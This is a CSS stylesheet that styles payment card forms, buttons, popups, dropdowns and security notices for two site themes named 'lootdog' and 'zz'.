@media (min-width:770px) {
	.pay-card-layout_type_lootdog .credit-card-form__popup .button,
	.pay-card-layout_type_lootdog .credit-card-form__submit .button {
		height: 32px;
		line-height: 32px
	}
}

.pay-card-layout_type_lootdog .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_lootdog .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 3px
}

.pay-card-layout_type_lootdog .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_lootdog .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_lootdog .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card-layout_type_lootdog .credit-card-form__submit .button.button_disabled_yes,
.pay-card-layout_type_lootdog .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card-layout_type_lootdog .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #383838;
	color: #717171;
	cursor: default
}

.pay-card-layout_type_lootdog .credit-card-form__popup .button {
	padding: 0 24px
}

.pay-card-layout_type_lootdog .credit-card-form__popup,
.pay-card-layout_type_lootdog .credit-card-form__popup-body {
	height: 100%
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block {
	background: transparent;
	margin: 0 auto
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: transparent
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table,
.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: transparent
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-bottom: 1px solid hsla(0, 0%, 59%, .204)
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0 0;
	font-size: 16px;
	line-height: 24px;
	color: #f5f5f7
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: none
}

.pay-card-layout_type_lootdog .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0 0;
	font-size: 14px;
	line-height: 22px;
	color: #f5f5f7;
	border-top: none;
	text-align: right
}

.pay-card-layout_type_lootdog .credit-card-form__tooltip {
	left: auto;
	right: 0;
	top: -50px;
	width: 100%;
	width: -webkit-calc(100% - 6px);
	width: calc(100% - 6px);
	min-width: 195px;
	padding: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000;
	background-color: #f5f5f7;
	-webkit-box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	line-height: 22px;
	text-align: left;
	white-space: normal
}

.pay-card-layout_type_lootdog .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 15px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #f5f5f7;
	border-width: 8px;
	margin-left: 0
}

.pay-card-layout_type_lootdog .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card-layout_type_lootdog .notification-block .payment-info-table__caption {
	padding: 10px 0;
	border-bottom: 1px solid hsla(0, 0%, 56%, .4);
	background-color: #f1f1f1
}

.pay-card-layout_type_lootdog .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card-layout_type_lootdog .notification-block .payment-info-table__caption,
.pay-card-layout_type_lootdog .notification-block .payment-info-table__cell,
.pay-card-layout_type_lootdog .notification-block .payment-info-table__head {
	font-size: 14px;
	color: rgba(0, 0, 0, .5);
	letter-spacing: -.3px
}

.pay-card-layout_type_lootdog .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card-layout_type_lootdog .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.pay-card-layout_type_lootdog .control__select {
	width: 100%!important
}

.pay-card-layout_type_lootdog .selectBox-arrow {
	display: block!important;
	right: 13px!important;
	width: 10px!important;
	height: 7px!important;
	border: none!important;
	background: none!important;
	font-family: Roboto, arial, helvetica
}

.pay-card-layout_type_lootdog .selectBox-arrow:before {
	content: "";
	display: block
}

.pay-card-layout_type_lootdog .selectBox-menuShowing .selectBox-arrow:before {
	content: ""
}

.pay-card-layout_type_lootdog .pay-card__card-selector:before {
	position: absolute;
	display: block;
	right: 14px;
	top: 47px;
	pointer-events: none;
	content: ""
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .pay-card__card-selector:before {
		top: 41px
	}
}

select.control__select_type_lootdog {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.control__select_type_lootdog-selectBox-dropdown-menu {
	padding-top: 8px;
	margin-top: 4px;
	background-color: #595959;
	color: #f5f5f7;
	border-radius: 3px;
	border: 1px solid #595959
}

.control__select_type_lootdog-selectBox-dropdown-menu.selectBox-options li a {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, arial, helvetica;
	color: #f5f5f7;
	line-height: 43px;
	padding: 0 27px;
	font-size: 15px
}

.control__select_type_lootdog-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a:before {
	content: "";
	display: inline-block;
	margin: auto;
	width: 5px;
	top: 43%;
	left: 8px;
	height: 9px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: translateY(-50%) rotate(45deg);
	-o-transform: translateY(-50%) rotate(45deg);
	transform: translateY(-50%) rotate(45deg);
	position: absolute
}

.control__select_type_lootdog-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a:hover,
.control__select_type_lootdog-selectBox-dropdown-menu.selectBox-options li a:hover {
	background: #404040
}

.control__select_type_lootdog-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	position: relative;
	color: #f5f5f7;
	background: none
}

.pay-card-layout_type_lootdog .notification-block .title {
	font-family: Roboto, arial, helvetica;
	margin: 0 0 25px;
	font-size: 20px;
	line-height: 24px;
	color: #f5f5f7
}

.pay-card-layout_type_lootdog .info-block .paragraph {
	font-family: Roboto, arial, helvetica;
	margin: 0 0 35px;
	font-size: 14px;
	line-height: 1.57;
	color: #d4d4d4
}

.pay-card-layout_type_lootdog .pay-card-layout__columns-wrapper {
	width: 100%;
	border-bottom: 1px solid #3d3f45;
	padding: 18px 0
}

.pay-card-layout_type_lootdog .pay-card-layout__columns {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	margin: auto;
	min-width: 290px;
	width: 60%;
	padding: 0 12px
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .pay-card-layout__columns {
		width: 440px
	}
}

.pay-card-layout_type_lootdog .pay-card-layout__column {
	color: #f5f5f7;
	font-family: Roboto, arial, helvetica;
	-webkit-font-smoothing: antialiased;
	width: 50%;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.pay-card-layout_type_lootdog .pay-card-layout__column.pay-card-layout__column_type_right {
	-webkit-box-pack: end;
	-webkit-justify-content: flex-end;
	justify-content: flex-end
}

.pay-card-layout_type_lootdog .pay-card-layout__sum,
.pay-card-layout_type_lootdog .pay-card-layout__title {
	margin: 0;
	padding: 0;
	font-size: 18px;
	line-height: 32px;
	font-weight: 500;
	color: #f5f5f7
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button:last-child {
	margin-right: 0
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button {
	color: #f5f5f5;
	border-radius: 3px;
	-webkit-tap-highlight-color: transparent;
	cursor: pointer;
	outline: none;
	width: 100%;
	height: 42px;
	line-height: 42px
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button,
.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button:active,
.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button:hover {
	background: #00a5ff
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button {
		height: 32px;
		line-height: 32px
	}
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button_theme_lootdog-secondary {
	color: #f5f5f5;
	border-radius: 3px;
	margin-bottom: 20px
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button_theme_lootdog-secondary,
.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button_theme_lootdog-secondary:active,
.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .button_theme_lootdog-secondary:hover {
	background: #454545
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question {
	display: none;
	position: fixed;
	left: 0;
	top: 0;
	width: 100%;
	height: 100%;
	z-index: 100;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #000;
	background-color: #24252a;
	-webkit-font-smoothing: antialiased
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .info-block__content {
	position: fixed;
	top: 50%;
	left: 50%;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%);
	padding: 0 12px;
	margin: -85px auto;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 3px;
	text-align: center;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	width: 60%;
	min-width: 290px
}

@media (min-width:770px) {
	.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .info-block__content {
		width: 440px
	}
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .paragraph,
.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .title {
	margin: 0;
	font-size: 17px;
	line-height: 1.57;
	color: #f5f5f7;
	font-family: Roboto, arial, helvetica;
	letter-spacing: .4px
}

.pay-card-layout_type_lootdog .pay-card-layout__notification_type_lootdog .info-block_type_question .paragraph {
	margin-bottom: 30px
}

.secure-information_type_lootdog {
	min-width: 290px;
	width: 60%;
	margin: 0 auto;
	padding: 0 12px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	-webkit-font-smoothing: antialiased
}

@media (min-width:770px) {
	.secure-information_type_lootdog {
		width: 440px
	}
}

.secure-information_type_lootdog .secure-information__icon {
	position: absolute;
	top: 50%;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%);
	left: 0
}

@media (min-width:770px) {
	.secure-information_type_lootdog .secure-information__icon {
		position: inherit;
		margin: 0 5px 0 0;
		display: inline-block;
		vertical-align: middle;
		top: 0;
		-webkit-transform: translateY(0);
		-o-transform: translateY(0);
		transform: translateY(0)
	}
}

.secure-information_type_lootdog .secure-information__text {
	position: relative;
	margin: 0;
	font-size: 13px;
	line-height: 18px;
	font-family: Roboto, arial, helvetica;
	color: #8f8f8f;
	padding-left: 27px;
	display: inline-block
}

@media (min-width:770px) {
	.secure-information_type_lootdog .secure-information__text {
		padding-left: 0
	}
}

.secure-information_type_lootdog .secure-information__text_type_protocol {
	line-height: 20px;
	vertical-align: middle;
	display: inline-block;
	margin: 0 20% 0 0
}

@media (min-width:770px) {
	.secure-information_type_lootdog .secure-information__text_type_protocol {
		margin: 0 5px 0 0
	}
}

.secure-information_type_lootdog .secure-information__text_type_secure-connection {
	display: inline-block;
	font-size: 13px;
	vertical-align: middle
}

.pay-card-layout_type_lootdog .credit-card-form__currency {
	font-family: Roboto, Arial, sans-serif
}

.pay-card_type_zz {
	position: relative;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-size: 15px;
	line-height: 20px
}

.pay-card_type_zz .pay-card__row {
	padding-top: 22px
}

.pay-card_type_zz .pay-card__card {
	width: 100%;
	padding-top: 5px
}

.pay-card-layout_type_zz .credit-card-form__popup-message,
.pay-card_type_zz .pay-card__message {
	color: #2e2e33;
	font-size: 31px;
	line-height: 32px;
	padding-top: 3px
}

.pay-card_type_zz .pay-card__card-selector {
	margin: 0 auto;
	width: 240px;
	margin-bottom: 20px;
	position: relative
}

.pay-card_type_zz .pay-card__select-card .control {
	margin-right: 0
}

.pay-card_type_zz .pay-card__select-card .control__select.selectBox-dropdown .selectBox-arrow {
	display: block;
	background: #fff;
	right: 22px;
	margin: -8px auto 0;
	width: 9px;
	height: 9px;
	border: solid #949599;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_zz .pay-card__select-card {
	width: 100%
}

.pay-card_type_zz .pay-card__select-card .control__select {
	border: 1px solid #e4e5e6;
	background: #fff;
	height: 42px;
	border-radius: 0
}

.pay-card_type_zz .pay-card__select-card .control__select.selectBox-menuShowing {
	border-color: #fff
}

.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li a,
.pay-card_type_zz .pay-card__select-card .control__select.selectBox-dropdown .selectBox-label {
	font-family: OsnovaPro, arial, helvetica;
	font-size: 17px;
	line-height: 40px;
	padding: 4px 16px 0;
	color: #949599
}

.pay-card_type_zz .pay-card__remove-card {
	background: #f6f6f6;
	border-radius: 4px;
	border: 1px solid #e4e5e6;
	position: absolute;
	top: 212px;
	left: -76px;
	z-index: 3;
	padding: 11px 15px 7px
}

.pay-card_type_zz .pay-card__remove-card-text {
	color: #2e2e33;
	font-size: 15px
}

.pay-card_type_zz .pay-card__remove-card:hover {
	color: #000
}

.pay-card_type_zz .pay-card__remove-card:active {
	color: #000;
	border-color: #bebebf
}

.pay-card_type_zz .credit-card-form__card-wrapper {
	width: 443px;
	height: 236px;
	margin: 0 auto 32px;
	position: relative
}

.pay-card_type_zz .credit-card-form__form {
	padding: 0;
	position: relative
}

.pay-card_type_zz .credit-card-form__card_position_back,
.pay-card_type_zz .credit-card-form__card_position_front {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 328px;
	height: 204px;
	padding: 16px;
	border-radius: 4px;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_zz .credit-card-form__card_position_front {
	position: relative;
	padding: 16px;
	background: #f6f6f6;
	left: 9px
}

.pay-card_type_zz .credit-card-form__card_position_back {
	top: 48px;
	right: -124px;
	background: #e4e5e6
}

.pay-card_type_zz .credit-card-form__card_position_back:before {
	height: 40px;
	margin: 0 -16px 40px;
	background: #949599
}

.pay-card_type_zz .payment-systems-icons {
	top: 0;
	margin: 0 0 16px;
	float: left
}

.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_mir,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_visa {
	top: 3px
}

.pay-card_type_zz .payment-systems-icon {
	float: right;
	margin: 0 15px 0 0
}

.pay-card_type_zz .payment-systems-icon.payment-systems-icon_name_mir_smaller,
.pay-card_type_zz .payment-systems-icon.payment-systems-icon_name_visa_smaller {
	top: 3px
}

.pay-card_type_zz .credit-card-form__label-group {
	clear: both
}

.pay-card_type_zz .credit-card-form__input {
	height: 40px;
	background: #fff;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	margin: 0;
	border-radius: 4px;
	border: none;
	color: #2e2e33;
	padding-left: 16px
}

.pay-card_type_zz .credit-card-form__input:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_zz .credit-card-form__input:disabled {
	background: #fff;
	color: #e4e5e6
}

.pay-card_type_zz .credit-card-form__input::-webkit-input-placeholder {
	color: #2e2e33
}

.pay-card_type_zz .credit-card-form__input::-moz-placeholder {
	color: #2e2e33
}

.pay-card_type_zz .credit-card-form__input::placeholder {
	color: #2e2e33
}

.pay-card_type_zz .credit-card-form__title {
	margin: 0;
	text-transform: none;
	font-size: 15px;
	line-height: 20px;
	color: #949599
}

.pay-card_type_zz .credit-card-form__label-group_type_cvv {
	left: -9px;
	top: -4px
}

.pay-card_type_zz .credit-card-form__label_type_cvv .credit-card-form__input {
	width: 67px
}

.pay-card_type_zz .credit-card-form__label-group_type_expiration-date {
	margin: -15px 0 0
}

.pay-card_type_zz .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_zz .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 85px
}

.pay-card_type_zz .credit-card-form__label-group_type_add-card {
	position: absolute;
	top: 155px;
	left: 125px;
	z-index: 2
}

.pay-card_type_zz .credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 17px;
	line-height: 20px;
	color: #949599
}

.pay-card_type_zz .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card_type_zz [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 16px;
	height: 16px;
	border: 2px solid #949599;
	border-radius: 4px
}

.pay-card_type_zz [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #2e2e33;
	border-color: #2e2e33
}

.pay-card_type_zz [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 12px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_zz .pay-card__select-card .control-label__text {
	display: none
}

.pay-card_type_zz .credit-card-form__terms {
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #949599;
	padding: 23px 0 9px
}

.pay-card_type_zz .credit-card-form__terms-link {
	text-decoration: none;
	color: #8cc623
}

.pay-card_type_zz .credit-card-form__terms-link:hover {
	text-decoration: none;
	color: #5c9100
}

.pay-card_type_zz .credit-card-form__label .credit-card-form__error-text {
	display: none
}

.pay-card_type_zz .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #f36
}

.pay-card_type_zz .credit-card-form__label_error_yes .credit-card-form__title {
	color: #f36
}

.pay-card_type_zz .credit-card-form__submit {
	margin-top: 17px
}

.pay-card-layout_type_zz .credit-card-form__popup .button,
.pay-card_type_zz .credit-card-form__submit .button {
	color: #fff;
	border-radius: 2px;
	background: #ffa115;
	margin: 0;
	font-size: 17px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	padding: 0 32px;
	font-weight: 700
}

.pay-card-layout_type_zz .credit-card-form__popup .button:hover,
.pay-card_type_zz .credit-card-form__submit .button:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card-layout_type_zz .credit-card-form__popup .button:active,
.pay-card_type_zz .credit-card-form__submit .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card_type_zz .credit-card-form__submit .button__light {
	color: #fff;
	border-radius: 2px;
	background: #ffa115
}

.pay-card_type_zz .credit-card-form__submit .button__light:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card_type_zz .credit-card-form__submit .button__light:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card_type_zz .credit-card-form__hr {
	border-bottom: 1px solid #f6f6f6;
	margin-bottom: 18px
}

.pay-card_type_zz .credit-card-form__currency {
	font-size: 22px
}

.pay-card_type_zz .credit-card-form__amount {
	font-size: 31px;
	line-height: 32px;
	color: #2e2e33;
	text-align: center
}

.pay-card_type_zz .notification-block .payment-info-table {
	width: 328px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	margin-bottom: 29px
}

.pay-card_type_zz .notification-block .payment-info-table,
.pay-card_type_zz .notification-block .payment-info-table__caption {
	background: #fff;
	position: relative;
	display: block;
	padding: 20px 16px 15px
}

.pay-card_type_zz .notification-block .payment-info-table:before {
	position: absolute;
	left: -8px;
	top: -4px;
	z-index: 1;
	content: "";
	font-size: 0;
	line-height: 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 344px;
	height: 8px;
	border-radius: 100px;
	background-color: #e4e5e6;
	-webkit-box-shadow: inset 0 1px 8px 0 #73737f;
	box-shadow: inset 0 1px 8px 0 #73737f;
	border: 2px solid rgba(46, 46, 51, .1)
}

.pay-card_type_zz .notification-block .payment-info-table__caption,
.pay-card_type_zz .notification-block .payment-info-table__cell,
.pay-card_type_zz .notification-block .payment-info-table__head {
	font-size: 15px;
	line-height: 20px;
	padding-bottom: 10px;
	vertical-align: top
}

.pay-card_type_zz .notification-block .payment-info-table__caption {
	position: relative;
	z-index: 2;
	display: block;
	margin: -20px -16px 12px;
	padding: 25px 16px 0;
	color: #2e2e33;
	text-align: left;
	background: #fff
}

.pay-card_type_zz .notification-block .payment-info-table__head {
	color: #949599;
	text-align: left;
	width: 98px;
	padding-left: 0
}

.pay-card_type_zz .notification-block .payment-info-table__cell {
	color: #2e2e33;
	padding-left: 0;
	padding-right: 0;
	width: 198px
}

.control__select_type_zz {
	width: 100%!important
}

.control__select_type_zz-selectBox-dropdown-menu {
	border: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #fff;
	-webkit-box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	box-shadow: 0 4px 4px 0 rgba(0, 0, 0, .1), 0 0 4px 0 rgba(0, 0, 0, .1);
	-webkit-transform: translateY(-42px);
	-o-transform: translateY(-42px);
	transform: translateY(-42px)
}

.control__select_type_zz-selectBox-dropdown-menu li:first-child {
	position: relative
}

.control__select_type_zz-selectBox-dropdown-menu li:first-child:before {
	content: "";
	display: block;
	background: transparent;
	right: 21px;
	top: 18px;
	position: absolute;
	width: 9px;
	height: 9px;
	border: solid #949599;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(-135deg);
	-o-transform: rotate(-135deg);
	transform: rotate(-135deg);
	pointer-events: none
}

.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	background: #f6f6f6
}

.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li a {
	height: 40px;
	line-height: 40px;
	-webkit-font-smoothing: antialiased
}

.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li.selectBox-hover:before,
.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li.selectBox-hover a {
	background: #f6f6f6;
	cursor: pointer
}

.control__select_type_zz-selectBox-dropdown-menu.selectBox-options li.selectBox-hover a:active {
	color: #000
}

.secure-information_type_zz {
	text-align: center;
	padding: $indent_size_zz_mobile 0;
	background: none;
	position: relative;
	border-top: 1px solid $border_color_zz_mobile_gray
}

.secure-information_type_zz .secure-information__icon {
	margin-right: 10px
}

.secure-information_type_zz .secure-information__text {
	font-family: $font_name_zz_mobile, arial, helvetica;
	display: block;
	font-size: 13px;
	line-height: 16px;
	color: #949599;
	margin-bottom: 10px
}

.secure-information_type_zz .protection-icons {
	padding-top: 8px;
	padding-left: 30px;
	margin-bottom: -5px
}

.secure-information_type_zz .protection-icons__list-item {
	margin-right: 10px
}

.pay-card-layout_type_zz,
.pay-card-layout_type_zz .credit-card-form__popup {
	padding-top: 22px;
	-webkit-font-smoothing: antialiased;
	font-family: OsnovaPro, arial, helvetica;
	width: 640px;
	border-radius: 8px;
	background-color: #fff;
	margin: 0 auto
}

.pay-card-layout_type_zz .clearfix:after,
.pay-card-layout_type_zz .clearfix:before {
	display: block
}

.pay-card-layout_type_zz .zz-icon_name_logo {
	margin: 0 auto
}

.pay-card-layout_type_zz .credit-card-form__popup-header {
	text-align: center
}

.pay-card-layout_type_zz .credit-card-form__popup-body {
	height: auto;
	padding-top: 161px
}

.pay-card-layout_type_zz .credit-card-form__popup-body .notification-block__inner {
	padding-bottom: 0
}

.pay-card-layout_type_zz .info-block__content {
	width: 519px;
	margin: 0 auto
}

.pay-card-layout_type_zz .info-block .paragraph,
.pay-card-layout_type_zz .notification-block .title {
	font-size: 21px;
	line-height: 28px;
	color: #949599
}

.pay-card-layout_type_zz .credit-card-form__popup .button {
	display: block;
	width: 300px;
	margin: 0 auto;
	text-align: center;
	color: #fff;
	border-radius: 2px;
	background: #ffa115
}

.pay-card-layout_type_zz .credit-card-form__popup .button:hover {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .05)), to(rgba(0, 0, 0, .05))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .05), rgba(0, 0, 0, .05)) #ffa115
}

.pay-card-layout_type_zz .credit-card-form__popup .button:active {
	background: -webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, .1)), to(rgba(0, 0, 0, .1))) #ffa115;
	background: -webkit-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: -o-linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115;
	background: linear-gradient(rgba(0, 0, 0, .1), rgba(0, 0, 0, .1)) #ffa115
}

.pay-card-layout_type_zz .credit-card-form__popup .button__light {
	background: #f6f6f6;
	color: #949599
}

.pay-card-layout_type_zz .credit-card-form__popup .button__light:active,
.pay-card-layout_type_zz .credit-card-form__popup .button__light:hover {
	background: #f6f6f6;
	color: #000
}

.pay-card-layout_type_zz .credit-card-form__popup .button:first-child {
	margin-bottom: 16px
}

.pay-card-layout_type_zz .credit-card-form__popup-body_type_loader .info-block__img-wrapper {
	width: 88px;
	height: 88px;
	position: absolute;
	top: 60px;
	left: 0;
	right: 0;
	margin: auto;
	border-radius: 50%;
	background: #fff
}

.pay-card-layout_type_zz .credit-card-form__popup-body_type_loader .info-block__img-wrapper .img {
	-webkit-animation: spin-clockwise 1s linear infinite;
	-o-animation: spin-clockwise 1s linear infinite;
	animation: spin-clockwise 1s linear infinite;
	z-index: 2;
	content: "";
	position: absolute;
	top: 28px;
	left: 28px;
	right: 28px;
	margin: auto
}

.pay-card-layout_type_zz .notification-block_status_ok .info-block .paragraph {
	font-size: 17px;
	font-weight: 600;
	line-height: 20px
}

.pay-card-layout_type_zz .notification-block_status_ok .button {
	width: auto
}

.pay-card-layout_type_zz .notification-block_status_ok .paragraph {
	position: relative
}

.pay-card-layout_type_zz .notification-block_status_ok .paragraph:before {
	position: absolute;
	left: 0;
	top: -30px;
	width: 100%;
	height: 0;
	border-bottom: 1px solid #f6f6f6;
	content: ""
}

.pay-card-layout_type_zz .notification-block_status_ok .info-block .img {
	margin-bottom: 23px
}

.pay-card-layout_type_zz .notification-block_status_ok .title {
	padding-bottom: 70px
}

.pay-card-layout_type_zz .info-block_type_session-countdown-timer {
	padding: 16px;
	text-align: center;
	font-size: 15px;
	line-height: 20px;
	color: #949599
}

.body_type_zz {
	height: auto;
	min-height: 100%;
	position: relative
}

.pay-card-layout_type_zz .credit-card-form__currency {
	font-family: Roboto, Arial, sans-serif
}

.pay-card-layout_type_zz-mobile .info-block_type_session-countdown-timer,
.pay-card_type_zz-mobile,
.secure-information_type_zz-mobile {
	min-width: 320px
}

.pay-card_type_zz-mobile {
	position: relative;
	font-size: 15px;
	line-height: 20px;
	-webkit-font-smoothing: antialiased
}

